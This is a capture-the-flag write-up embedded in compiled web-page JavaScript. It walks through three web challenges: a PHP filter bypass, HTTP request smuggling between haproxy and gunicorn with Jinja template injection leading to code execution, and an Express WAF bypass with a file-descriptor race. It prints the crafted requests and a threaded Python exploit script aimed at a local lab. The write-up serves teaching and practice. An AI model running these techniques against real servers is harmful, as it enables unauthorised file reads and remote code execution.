#89DDFF">"</span><span style="color: #C3E88D">/admin</span><span style="color: #89DDFF">"</span><span style="color: #F07178">) </span><span style="color: #89DDFF">&&</span><span style="color: #F07178"> </span><span style="color: #EEFFFF">req</span><span style="color: #89DDFF">.</span><span style="color: #EEFFFF">headers</span><span style="color: #89DDFF">.</span><span style="color: #EEFFFF">authorization</span><span style="color: #F07178"> </span><span style="color: #89DDFF">!==</span><span style="color: #F07178"> </span><span style="color: #89DDFF">&#96;</span><span style="color: #C3E88D">Bearer </span><span style="color: #89DDFF">$&#123;</span><span style="color: #EEFFFF">ADMIN_AUTH</span><span style="color: #89DDFF">&#125;&#96;</span><span style="color: #F07178">) </span><span style="color: #89DDFF">&#123;</span></div><div class='line'><span style="color: #F07178">        </span><span style="color: #89DDFF">return</span><span style="color: #F07178"> </span><span style="color: #EEFFFF">res</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">status</span><span style="color: #F07178">(</span><span style="color: #F78C6C">403</span><span style="color: #F07178">)</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">end</span><span style="color: #F07178">()</span><span style="color: #89DDFF">;</span></div><div class='line'><span style="color: #F07178">    </span><span style="color: #89DDFF">&#125;</span></div><div class='line'></div><div class='line'><span style="color: #F07178">    </span><span style="color: #82AAFF">next</span><span style="color: #F07178">()</span><span style="color: #89DDFF">;</span></div><div class='line'><span style="color: #89DDFF">&#125;</span><span style="color: #EEFFFF">)</span><span style="color: #89DDFF">;</span></div></code></div></pre>`,gl,q,Oo,kl,Po,qo,xl,Ho,$o,ba,Ol,NF=`<pre class="shiki material-default" style="background-color: #263238; color: #EEFFFF" javascript="true"><div class="language-id">javascript</div><div class='code-container'><code><div class='line'><span style="color: #EEFFFF">req</span><span style="color: #89DDFF">.</span><span style="color: #EEFFFF">originalUrl </span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF"> req</span><span style="color: #89DDFF">.</span><span style="color: #EEFFFF">orignalUrl </span><span style="color: #89DDFF">||</span><span style="color: #EEFFFF"> req</span><span style="color: #89DDFF">.</span><span style="color: #EEFFFF">url</span></div></code></div></pre>`,Pl,g,So,ql,Ro,Io,Hl,Lo,Go,$l,jo,Uo,Ta,Sl,MF=`<pre class="shiki material-default" style="background-color: #263238; color: #EEFFFF"><div class='code-container'><code><div class='line'><span style="color: undefined">GET http://localhost/admin/debug HTTP/1.1</span></div><div class='line'><span style="color: undefined">Host: localhost:3000</span></div></code></div></pre>`,Rl,rs,Wo,ga,Il,zF=`<pre class="shiki material-default" style="background-color: #263238; color: #EEFFFF" javascript="true"><div class="language-id">javascript</div><div class='code-container'><code><div class='line'><span style="color: #C792EA">const</span><span style="color: #EEFFFF"> file </span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF"> req</span><span style="color: #89DDFF">.</span><span style="color: #EEFFFF">query</span><span style="color: #89DDFF">.</span><span style="color: #EEFFFF">file </span><span style="color: #89DDFF">??</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">/etc/hostname</span><span style="color: #89DDFF">"</span><span style="color: #89DDFF">;</span></div><div class='line'><span style="color: #EEFFFF">console</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">log</span><span style="color: #EEFFFF">(</span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">file requesting: </span><span style="color: #89DDFF">"</span><span style="color: #89DDFF">,</span><span style="color: #EEFFFF"> file)</span></div><div class='line'><span style="color: #C792EA">const</span><span style="color: #EEFFFF"> contents </span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">await</span><span style="color: #EEFFFF"> fsp</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">readFile</span><span style="color: #EEFFFF">(file)</span><span style="color: #89DDFF">;</span></div></code></div></pre>`,Ll,f,Bo,Gl,Ko,No,jl,Mo,zo,Ul,Qo,Zo,Wl,Jo,Xo,Bl,Vo,Yo,ka,Kl,QF=`<pre class="shiki material-default" style="background-color: #263238; color: #EEFFFF" javascript="true"><div class="language-id">javascript</div><div class='code-container'><code><div class='line'><span style="color: #C792EA">let</span><span style="color: #EEFFFF"> obj </span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">&#123;&#125;</span></div><div class='line'><span style="color: #EEFFFF">obj[</span><span style="color: #89DDFF">'</span><span style="color: #C3E88D">protocol</span><span style="color: #89DDFF">'</span><span style="color: #EEFFFF">] </span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">'</span><span style="color: #C3E88D">file:</span><span style="color: #89DDFF">'</span></div><div class='line'><span style="color: #EEFFFF">obj[</span><span style="color: #89DDFF">'</span><span style="color: #C3E88D">href</span><span style="color: #89DDFF">'</span><span style="color: #EEFFFF">] </span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">'</span><span style="color: #C3E88D">a</span><span style="color: #89DDFF">'</span></div><div class='line'><span style="color: #EEFFFF">obj[</span><span style="color: #89DDFF">'</span><span style="color: #C3E88D">hostname</span><span style="color: #89DDFF">'</span><span style="color: #EEFFFF">] </span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">''</span></div><div class='line'><span style="color: #EEFFFF">obj[</span><span style="color: #89DDFF">'</span><span style="color: #C3E88D">pathname</span><span style="color: #89DDFF">'</span><span style="color: #EEFFFF">] </span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">'</span><span style="color: #C3E88D">/flag.txt</span><span style="color: #89DDFF">'</span></div></code></div></pre>`,Nl,U,sn,Ml,ln,an,xa,zl,ZF=`<pre class="shiki material-default" style="background-color: #263238; color: #EEFFFF"><div class='code-container'><code><div class='line'><span style="color: undefined">GET http://localhost/admin/debig?file[href]=a&file[protocol]=file:&file[hostname]=&file[pathname]=/fl%2561g.txt HTTP/1.1</span></div></code></div></pre>`,Ql,is,en,Oa,Zl,JF=`<pre class="shiki material-default" style="background-color: #263238; color: #EEFFFF" javascript="true"><div class="language-id">javascript</div><div class='code-container'><code><div class='line'><span style="color: #89DDFF">if</span><span style="color: #EEFFFF"> (file</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">includes</span><span style="color: #EEFFFF">(</span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">flag</span><span style="color: #89DDFF">"</span><span style="color: #EEFFFF">)) </span><span style="color: #89DDFF">&#123;</span></div><div class='line'><span style="color: #F07178">    </span><span style="color: #89DDFF">return</span><span style="color: #F07178"> </span><span style="color: #EEFFFF">res</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">status</span><span style="color: #F07178">(</span><span style="color: #F78C6C">404</span><span style="color: #F07178">)</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">end</span><span style="color: #F07178">()</span><span style="color: #89DDFF">;</span></div><div class='line'><span style="color: #89DDFF">&#125;</span></div></code></div></pre>`,Jl,k,on,Xl,nn,Fn,Vl,pn,tn,Yl,cn,rn,Pa,sa,XF=`<pre class="shiki material-default" style="background-color: #263238; color: #EEFFFF" python="true"><div class="language-id">python</div><div class='code-container'><code><div class='line'><span style="color: #89DDFF">import</span><span style="color: #EEFFFF"> threading</span></div><div class='line'><span style="color: #89DDFF">import</span><span style="color: #EEFFFF"> requests</span></div><div class='line'><span style="color: #89DDFF">import</span><span style="color: #EEFFFF"> time</span></div><div class='line'><span style="color: #89DDFF">import</span><span style="color: #EEFFFF"> socket</span></div><div class='line'></div><div class='line'><span style="color: #C792EA">class</span><span style="color: #EEFFFF"> </span><span style="color: #FFCB6B">EXPLOIT</span><span style="color: #89DDFF">:</span></div><div class='line'></div><div class='line'><span style="color: #EEFFFF">    __ENCODED </span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">/fl%2561g.txt</span><span style="color: #89DDFF">"</span></div><div class='line'><span style="color: #EEFFFF">    __TARGET </span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">http://localhost:3000</span><span style="color: #89DDFF">"</span></div><div class='line'><span style="color: #EEFFFF">    __DICTREAD </span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">file[href]=a&file[protocol]=file:&file[hostname]=&file[pathname]=&#123;&#125;</span><span style="color: #89DDFF">"</span></div><div class='line'><span style="color: #EEFFFF">    __DESCRIPTPOR </span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">/proc/self/fd/26</span><span style="color: #89DDFF">"</span></div><div class='line'></div><div class='line'><span style="color: #EEFFFF">    </span><span style="color: #C792EA">def</span><span style="color: #EEFFFF"> </span><span style="color: #82AAFF">__init__</span><span style="color: #89DDFF">(</span><span style="color: #EEFFFF">self</span><span style="color: #89DDFF">):</span></div><div class='line'><span style="color: #EEFFFF">        self</span><span style="color: #89DDFF">.</span><span style="color: #F07178">url</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">"""</span><span style="color: #C3E88D">&#123;&#125;/admin/debug?&#123;&#125;</span><span style="color: #89DDFF">"""</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">format</span><span style="color: #89DDFF">(</span></div><div class='line'><span style="color: #82AAFF">            </span><span style="color: #EEFFFF">self</span><span style="color: #89DDFF">.</span><span style="color: #F07178">__TARGET</span><span style="color: #89DDFF">,</span></div><div class='line'><span style="color: #82AAFF">            </span><span style="color: #EEFFFF">self</span><span style="color: #89DDFF">.</span><span style="color: #F07178">__DICTREAD</span></div><div class='line'><span style="color: #82AAFF">        </span><span style="color: #89DDFF">).</span><span style="color: #82AAFF">format</span><span style="color: #89DDFF">(</span></div><div class='line'><span style="color: #82AAFF">            </span><span style="color: #EEFFFF">self</span><span style="color: #89DDFF">.</span><span style="color: #F07178">__ENCODED</span></div><div class='line'><span style="color: #82AAFF">        </span><span style="color: #89DDFF">)</span></div><div class='line'><span style="color: #EEFFFF">        self</span><span style="color: #89DDFF">.</span><span style="color: #F07178">url2</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">"""</span><span style="color: #C3E88D">&#123;&#125;/admin/debug?file=&#123;&#125;</span><span style="color: #89DDFF">"""</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">format</span><span style="color: #89DDFF">(</span></div><div class='line'><span style="color: #82AAFF">            </span><span style="color: #EEFFFF">self</span><span style="color: #89DDFF">.</span><span style="color: #F07178">__TARGET</span><span style="color: #89DDFF">,</span></div><div class='line'><span style="color: #82AAFF">            </span><span style="color: #EEFFFF">self</span><span style="color: #89DDFF">.</span><span style="color: #F07178">__DESCRIPTPOR</span></div><div class='line'><span style="color: #82AAFF">        </span><span style="color: #89DDFF">)</span></div><div class='line'></div><div class='line'><span style="color: #EEFFFF">    </span><span style="color: #C792EA">def</span><span style="color: #EEFFFF"> </span><span style="color: #82AAFF">request</span><span style="color: #89DDFF">(</span><span style="color: #EEFFFF">self</span><span style="color: #89DDFF">,</span><span style="color: #EEFFFF"> raw_data</span><span style="color: #89DDFF">,</span><span style="color: #EEFFFF"> wait</span><span style="color: #89DDFF">=False):</span></div><div class='line'><span style="color: #EEFFFF">        p </span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF"> socket</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">socket</span><span style="color: #89DDFF">(</span><span style="color: #82AAFF">socket</span><span style="color: #89DDFF">.</span><span style="color: #F07178">AF_INET</span><span style="color: #89DDFF">,</span><span style="color: #82AAFF"> socket</span><span style="color: #89DDFF">.</span><span style="color: #F07178">SOCK_STREAM</span><span style="color: #89DDFF">)</span></div><div class='line'><span style="color: #EEFFFF">        p</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">connect</span><span style="color: #89DDFF">((</span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">192.168.2.69</span><span style="color: #89DDFF">"</span><span style="color: #89DDFF">,</span><span style="color: #82AAFF"> </span><span style="color: #F78C6C">8000</span><span style="color: #89DDFF">))</span></div><div class='line'><span style="color: #EEFFFF">        p</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">send</span><span style="color: #89DDFF">(</span><span style="color: #82AAFF">raw_data</span><span style="color: #89DDFF">)</span></div><div class='line'><span style="color: #EEFFFF">        </span><span style="color: #89DDFF">if</span><span style="color: #EEFFFF"> wait</span><span style="color: #89DDFF">:</span></div><div class='line'><span style="color: #EEFFFF">            data </span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF"> p</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">recv</span><span style="color: #89DDFF">(</span><span style="color: #F78C6C">5000</span><span style="color: #89DDFF">)</span></div><div class='line'><span style="color: #EEFFFF">            </span><span style="color: #89DDFF">if</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">flag</span><span style="color: #89DDFF">"</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">in</span><span style="color: #EEFFFF"> data</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">decode</span><span style="color: #89DDFF">():</span></div><div class='line'><span style="color: #EEFFFF">                </span><span style="color: #82AAFF">print</span><span style="color: #89DDFF">(</span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">Flag: </span><span style="color: #89DDFF">"</span><span style="color: #89DDFF">,</span><span style="color: #82AAFF"> data</span><span style="color: #89DDFF">)</span></div><div class='line'><span style="color: #EEFFFF">        p</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">close</span><span style="color: #89DDFF">()</span></div><div class='line'></div><div class='line'><span style="color: #EEFFFF">    </span><span style="color: #C792EA">def</span><span style="color: #EEFFFF"> </span><span style="color: #82AAFF">baby_maker</span><span style="color: #89DDFF">(</span><span style="color: #EEFFFF">self</span><span style="color: #89DDFF">,</span><span style="color: #EEFFFF"> url</span><span style="color: #89DDFF">):</span></div><div class='line'><span style="color: #EEFFFF">        </span><span style="color: #82AAFF">print</span><span style="color: #89DDFF">(</span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">Started Baby Maker...</span><span style="color: #89DDFF">"</span><span style="color: #89DDFF">)</span></div><div class='line'><span style="color: #EEFFFF">        </span><span style="color: #89DDFF">while</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">True:</span></div><div class='line'><span style="color: #EEFFFF">            t </span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF"> threading</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">Thread</span><span style="color: #89DDFF">(</span><span style="color: #EEFFFF">target</span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF">self</span><span style="color: #89DDFF">.</span><span style="color: #F07178">request</span><span style="color: #89DDFF">,</span><span style="color: #82AAFF"> </span><span style="color: #EEFFFF">args</span><span style="color: #89DDFF">=(</span><span style="color: #82AAFF">url</span><span style="color: #89DDFF">,))</span></div><div class='line'><span style="color: #EEFFFF">            t</span><span style="color: #89DDFF">.</span><span style="color: #F07178">daemon</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">True</span></div><div class='line'><span style="color: #EEFFFF">            t</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">start</span><span style="color: #89DDFF">()</span></div><div class='line'></div><div class='line'><span style="color: #EEFFFF">    </span><span style="color: #C792EA">def</span><span style="color: #EEFFFF"> </span><span style="color: #82AAFF">engage</span><span style="color: #89DDFF">(</span><span style="color: #EEFFFF">self</span><span style="color: #89DDFF">):</span></div><div class='line'><span style="color: #EEFFFF">        url </span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF"> </span><span style="color: #C792EA">b</span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">GET </span><span style="color: #89DDFF">"</span><span style="color: #89DDFF">+</span><span style="color: #EEFFFF"> self</span><span style="color: #89DDFF">.</span><span style="color: #F07178">url</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">encode</span><span style="color: #89DDFF">()</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">+</span><span style="color: #EEFFFF"> </span><span style="color: #C792EA">b</span><span style="color: #89DDFF">"</span><span style="color: #C3E88D"> HTTP/1.1</span><span style="color: #EEFFFF">&#92;r&#92;n</span><span style="color: #C3E88D">Host: localhost:8000</span><span style="color: #EEFFFF">&#92;r&#92;n&#92;r&#92;n</span><span style="color: #89DDFF">"</span></div><div class='line'><span style="color: #EEFFFF">        url2 </span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF"> </span><span style="color: #C792EA">b</span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">GET </span><span style="color: #89DDFF">"</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">+</span><span style="color: #EEFFFF"> self</span><span style="color: #89DDFF">.</span><span style="color: #F07178">url2</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">encode</span><span style="color: #89DDFF">()</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">+</span><span style="color: #EEFFFF"> </span><span style="color: #C792EA">b</span><span style="color: #89DDFF">"</span><span style="color: #C3E88D"> HTTP/1.1</span><span style="color: #EEFFFF">&#92;r&#92;n</span><span style="color: #C3E88D">Host: localhost:8000</span><span style="color: #EEFFFF">&#92;r&#92;n&#92;r&#92;n</span><span style="color: #89DDFF">"</span></div><div class='line'></div><div class='line'><span style="color: #EEFFFF">        t </span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF"> threading</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">Thread</span><span style="color: #89DDFF">(</span><span style="color: #EEFFFF">target</span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF">self</span><span style="color: #89DDFF">.</span><span style="color: #F07178">baby_maker</span><span style="color: #89DDFF">,</span><span style="color: #82AAFF"> </span><span style="color: #EEFFFF">args</span><span style="color: #89DDFF">=(</span><span style="color: #82AAFF">url</span><span style="color: #89DDFF">,))</span></div><div class='line'><span style="color: #EEFFFF">        t</span><span style="color: #89DDFF">.</span><span style="color: #F07178">daemon</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">True</span></div><div class='line'><span style="color: #EEFFFF">        t</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">start</span><span style="color: #89DDFF">()</span></div><div class='line'></div><div class='line'><span style="color: #EEFFFF">        </span><span style="color: #89DDFF">while</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">True:</span></div><div class='line'><span style="color: #EEFFFF">            t2 </span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF"> threading</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">Thread</span><span style="color: #89DDFF">(</span><span style="color: #EEFFFF">target</span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF">self</span><span style="color: #89DDFF">.</span><span style="color: #F07178">request</span><span style="color: #89DDFF">,</span><span style="color: #82AAFF"> </span><span style="color: #EEFFFF">args</span><span style="color: #89DDFF">=(</span><span style="color: #82AAFF">url2</span><span style="color: #89DDFF">,</span><span style="color: #82AAFF"> </span><span style="color: #89DDFF">True))</span></div><div class='line'><span style="color: #EEFFFF">            t2</span><span style="color: #89DDFF">.</span><span style="color: #F07178">daemon</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">True</span></div><div class='line'><span style="color: #EEFFFF">            t2</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">start</span><span style="color: #89DDFF">()</span></div><div class='line'></div><div class='line'><span style="color: #89DDFF">if</span><span style="color: #EEFFFF"> __name__ </span><span style="color: #89DDFF">==</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">__main__</span><span style="color: #89DDFF">"</span><span style="color: #89DDFF">:</span></div><div class='line'><span style="color: #EEFFFF">    </span><span style="color: #82AAFF">EXPLOIT</span><span style="color: #89DDFF">().</span><span style="color: #82AAFF">engage</span><span style="color: #89DDFF">()</span></div></code></div></pre>`,la;return{c(){y=F("h2"),A=F("a"),S=e("readme | Easy"),R=r(),D=F("blockquote"),h=F("p"),Y=e("The flag was in "),vs=F("code"),ja=e(".ht_flag.txt"),Ua=e(" file."),aa=r(),ss=F("p"),Wa=e("This challenge was basically the upgraded version of the easy challenge from Karachi. The challenge was exactly similar except for one minor thing. The source code of the challenge is given as:"),ea=r(),fs=new d(!1),hs=r(),ls=F("p"),Ba=e("While analyzing the code and comparing it with the challenge from Karachi, i came across the difference in both files which was the regex in the filter:"),oa=r(),us=new d(!1),_s=r(),u=F("p"),Ka=e("Whilst, in "),ms=F("strong"),Na=e("Karachi"),Ma=e(" challenge in regex, we had the "),As=F("code"),za=e("multiline"),Qa=e(" flag like this: "),ws=F("code"),Za=e("/^.(php|flag)./m"),Ja=e(". This doesn’t mean much except for the fact that we can use a newline character "),Cs=F("code"),Xa=e("\\n"),Va=e(" to bypass this regex."),na=r(),I=F("p"),Ya=e("The actual solution for the Karachi challenge was that we can do a "),bs=F("code"),se=e("Catastrophic Backtracking Attack"),le=e(" to provide a large string to PHP which would bypass the regex as well. I tried that for a while with no success. Then analyzing the code, the following part seems to be vulnerable:"),Fa=r(),Ts=new d(!1),gs=r(),w=F("p"),ae=e("In the second condition, we are removing the last element of "),ks=F("code"),ee=e("$safeParts"),oe=e(" array which means that if the element in array if "),xs=F("code"),ne=e(".."),Fe=e(" whatever the last character is will be removed. Combining this with the regex bypass earlier of "),Os=F("code"),pe=e("newline"),te=e(". We can send an input such as:"),pa=r(),Ps=new d(!1),qs=r(),L=F("p"),ce=e("This bypassed the filter and we can read the "),Hs=F("code"),re=e("index.php"),ie=e(" file. The final script to read the flag:"),ta=r(),$s=new d(!1),Ss=r(),Q=F("h2"),as=F("a"),ye=e("SMG | Medium"),ca=r(),es=F("blockquote"),Rs=F("p"),De=e("This is related to HTTP Descync"),ra=r(),G=F("p"),de=e("The challenge contained a "),Is=F("code"),Ee=e("haproxy"),ve=e(" behind which a flask app is running. The web app is basically vulnerable to SSTI. The vulnerable function on the backend is:"),ia=r(),Ls=new d(!1),Gs=r(),O=F("p"),fe=e("The input from user is being directly passed through "),js=F("code"),he=e("render_template_string"),ue=e(" function. This looks quite straight forward. However, "),Us=F("code"),_e=e("haproxy"),me=e(" doesn’t let us access URL:"),ya=r(),Ws=new d(!1),Bs=r(),C=F("p"),Ae=e("Morever, with second ACL condition, its also difficult to provide "),Ks=F("code"),we=e("URL-encoded"),Ce=e(" strings. Reading the code, we are using a very specific version of "),Ns=F("code"),be=e("gunicorn"),Te=e(" in "),Ms=F("code"),ge=e("Dockerfile"),ke=e(":"),Da=r(),zs=new d(!1),Qs=r(),b=F("p"),xe=e("The version "),Zs=F("code"),Oe=e("gunicorn<=20.0.4"),Pe=e(" is very specific here to be exact. Looking online, i came across an HTTP Desync in this very specific version. Reading the blogs, i found a request specific for "),Js=F("code"),qe=e("haproxy"),He=e(" with "),Xs=F("code"),$e=e("gunicorn"),Se=e(":"),da=r(),Vs=new d(!1),Ys=r(),v=F("p"),Re=e("The request worked. However, everytime you change the payload the "),sl=F("code"),Ie=e("Content-Length"),Le=e(` here needs to be very correctly specified. If this is wrong, this would result in error. The first content length header
of `),ll=F("code"),Ge=e("68"),je=e(" starts from the letter "),al=F("code"),Ue=e("xxx.."),We=e(" and ends where the next request starts. While the second header of length "),el=F("code"),Be=e("35"),Ke=e(" starts at the beginning of body which is at "),ol=F("code"),Ne=e("GET"),Me=e(` at the moment
and it ends at the `),nl=F("code"),ze=e("\\r\\n\\r\\n"),Qe=e("."),Ea=r(),_=F("p"),Ze=e("The left up part is SSTI. Reading the filters, we can’t use "),Fl=F("code"),Je=e("{{"),Xe=e(" and "),pl=F("code"),Ve=e("}}"),Ye=e(". However, payloads like "),tl=F("code"),so=e("{%%}"),lo=e(" can still be used. The "),cl=F("code"),ao=e("{% with %}"),eo=e(" tag can be used to get RCE:"),va=r(),rl=new d(!1),il=r(),T=F("p"),oo=e("Initially i called "),yl=F("code"),no=e("import_string"),Fo=e(" from "),Dl=F("code"),po=e("__globals__"),to=e(" but that doesn’t work for some reason. So, lets go the old way of finding the "),dl=F("code"),co=e("Popen"),ro=e(" function first. Get the classes:"),fa=r(),El=new d(!1),vl=r(),j=F("p"),io=e("This would result in a large output. Clean the output, store the list properly and the index of the "),fl=F("code"),yo=e("Popen"),Do=e(" function. Once, you get the index, payload becomes simple:"),ha=r(),hl=new d(!1),ul=r(),os=F("p"),Eo=e("With the final request would become:"),ua=r(),_l=new d(!1),ml=r(),Z=F("h2"),ns=F("a"),vo=e("wtwaf | Hard"),_a=r(),Fs=F("blockquote"),Al=F("p"),fo=e("Code Analysis & Race Condition. I wasn’t able to solve this challenge within due time. And kudos to its author and team Sekai for all the help in solving this later on."),ma=r(),ps=F("p"),ho=e("Reading the code, we had to exploit 3 things:"),Aa=r(),P=F("ul"),J=F("li"),uo=e("Bypass the "),wl=F("code"),_o=e('req.originalUrl.toLowerCase().startsWith("/admin")'),mo=e(" statement."),Ao=r(),ts=F("li"),wo=e("Bypass the WAF: "),Cl=F("code"),Co=e('(item) => item && JSON.stringify(item).includes("flag")'),bo=r(),X=F("li"),To=e("Race conditon in "),bl=F("code"),go=e("/admin/debug"),ko=e(" call."),wa=r(),cs=F("p"),xo=e("Initially, we need to bypass the middleware:"),Ca=r(),Tl=new d(!1),gl=r(),q=F("p"),Oo=e("This would require us to do a bit of code analysis of "),kl=F("code"),Po=e("express.js"),qo=e(". The "),xl=F("code"),Ho=e("req.originalUrl"),$o=e(" is created as:"),ba=r(),Ol=new d(!1),Pl=r(),g=F("p"),So=e("The "),ql=F("code"),Ro=e("req.url"),Io=e(" is the url after "),Hl=F("code"),Lo=e("GET"),Go=e(" in http request. And the requests are resolved through pathname. The first condition can be bypassed by providing a full url after "),$l=F("code"),jo=e("GET"),Uo=e(":"),Ta=r(),Sl=new d(!1),Rl=r(),rs=F("p"),Wo=e("At the reading part we have:"),ga=r(),Il=new d(!1),Ll=r(),f=F("p"),Bo=e("The "),Gl=F("code"),Ko=e("file"),No=e(" parameter can be dictionary as extended parameters are not set to "),jl=F("code"),Mo=e("false"),zo=e(". The "),Ul=F("code"),Qo=e("readFileSync"),Zo=e(" and similar functions such as "),Wl=F("code"),Jo=e("readFile"),Xo=e(" can accept a dictionary with a specified set of attributes. The "),Bl=F("code"),Vo=e("object"),Yo=e(" to read a file is:"),ka=r(),Kl=new d(!1),Nl=r(),U=F("p"),sn=e("Furthermore, the value of "),Ml=F("code"),ln=e("pathname"),an=e(" can be `urlencoded as well:"),xa=r(),zl=new d(!1),Ql=r(),is=F("p"),en=e("When the above url is requested, the file be read. However, an error will trigger at following line:"),Oa=r(),Zl=new d(!1),Jl=r(),k=F("p"),on=e("Because now our parameter is an "),Xl=F("code"),nn=e("object"),Fn=e(" and it doesn’t have a function named "),Vl=F("code"),pn=e("includes"),tn=e(". This is where the race conditions comes in. Since, the "),Yl=F("code"),cn=e("readFile"),rn=e(` function is being successfully called, a file descriptor must have opened as well for this.
This is a very short window. If we can race the descriptor when the file is opened, we can read the flag. However, we can’t get just one descriptor as the time in which it opens is way too short. To cope this, we can generate infinity descriptors and try to race one.
This worked actually and the final poc would look like:`),Pa=r(),sa=new d(!1),la=xF(),this.h()},l(s){y=p(s,"H2",{id:!0});var n=t(y);A=p(n,"A",{href:!0});var dn=t(A);S=o(dn,"readme | Easy"),dn.forEach(a),n.forEach(a),R=i(s),D=p(s,"BLOCKQUOTE",{});var En=t(D);h=p(En,"P",{});var qa=t(h);Y=o(qa,"The flag was in "),vs=p(qa,"CODE",{});var vn=t(vs);ja=o(vn,".ht_flag.txt"),vn.forEach(a),Ua=o(qa," file."),qa.forEach(a),En.forEach(a),aa=i(s),ss=p(s,"P",{});var fn=t(ss);Wa=o(fn,"This challenge was basically the upgraded version of the easy challenge from Karachi. The challenge was exactly similar except for one minor thing. The source code of the challenge is given as:"),fn.forEach(a),ea=i(s),fs=E(s,!1),hs=i(s),ls=p(s,"P",{});var hn=t(ls);Ba=o(hn,"While analyzing the code and comparing it with the challenge from Karachi, i came across the difference in both files which was the regex in the filter:"),hn.forEach(a),oa=i(s),us=E(s,!1),_s=i(s),u=p(s,"P",{});var H=t(u);Ka=o(H,"Whilst, in "),ms=p(H,"STRONG",{});var un=t(ms);Na=o(un,"Karachi"),un.forEach(a),Ma=o(H," challenge in regex, we had the "),As=p(H,"CODE",{});var _n=t(As);za=o(_n,"multiline"),_n.forEach(a),Qa=o(H," flag like this: "),ws=p(H,"CODE",{});var mn=t(ws);Za=o(mn,"/^.(php|flag)./m"),mn.forEach(a),Ja=o(H,". This doesn’t mean much except for the fact that we can use a newline character "),Cs=p(H,"CODE",{});var An=t(Cs);Xa=o(An,"\\n"),An.forEach(a),Va=o(H," to bypass this regex."),H.forEach(a),na=i(s),I=p(s,"P",{});var Ha=t(I);Ya=o(Ha,"The actual solution for the Karachi challenge was that we can do a "),bs=p(Ha,"CODE",{});var wn=t(bs);se=o(wn,"Catastrophic Backtracking Attack"),wn.forEach(a),le=o(Ha," to provide a large string to PHP which would bypass the regex as well. I tried that for a while with no success. Then analyzing the code, the following part seems to be vulnerable:"),Ha.forEach(a),Fa=i(s),Ts=E(s,!1),gs=i(s),w=p(s,"P",{});var W=t(w);ae=o(W,"In the second condition, we are removing the last element of "),ks=p(W,"CODE",{});var 